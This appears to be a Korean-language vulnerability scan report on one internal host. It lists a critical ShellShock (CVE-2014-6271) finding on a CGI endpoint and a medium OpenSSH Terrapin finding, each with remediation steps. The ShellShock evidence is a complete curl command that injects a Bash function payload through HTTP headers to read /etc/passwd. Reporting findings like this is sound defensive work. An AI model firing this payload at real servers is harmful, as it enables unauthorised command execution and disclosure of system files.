# `CRITICAL`
## ShellShock - Remote Code Execution
- **End-Point**: `http://10.48.185.20//cgi-bin/test.cgi`, `http://10.48.185.20/cgi-bin/test.cgi`
- **영향**: 원격 코드 실행(Remote Code Execution)으로 인해 무단 접근, 데이터 유출 및 시스템 침해로 이어질 수 있습니다.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수 값의 함수 정의 뒤에 오는 문자열을 처리하여, 조작된 환경을 통해 원격 공격자가 임의 코드를 실행할 수 있는 취약점입니다 (CVE-2014-6271, ShellShock).
- **근거**:
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36' 'http://10.48.185.20//cgi-bin/test.cgi'
```
- **대응**: Bash를 최신 버전으로 업데이트하여 ShellShock 취약점(CVE-2014-6271)을 패치해야 합니다.
- **조치**: 웹 서버의 CGI 스크립트 실행 환경에서 환경 변수 필터링을 강화하고, 불필요한 Bash 스크립트 사용을 제한하여 공격 표면을 줄여야 합니다.

# `MEDIUM`
## OpenSSH Terrapin Attack - Detection
- **End-Point**: `10.48.185.20:22`
- **영향**: -
- **설명**: 특정 OpenSSH 확장 기능을 사용하는 SSH 전송 프로토콜(OpenSSH 9.6 이전 버전)에서 무결성 검사를 우회하여 일부 패킷이 누락될 수 있으며, 이로 인해 보안 기능이 저하되거나 비활성화될 수 있는 취약점입니다 (CVE-2023-48795, Terrapin Attack).
- **근거**: -
- **대응**: OpenSSH를 9.6 이상 버전으로 업데이트하여 Terrapin Attack 취약점(CVE-2023-48795)을 패치해야 합니다.
- **조치**: SSH 서버 및 클라이언트에서 최신 보안 패치를 적용하고, 가능한 경우 강력한 암호화 및 MAC 알고리즘을 사용하도록 설정하여 보안 강도를 높여야 합니다.
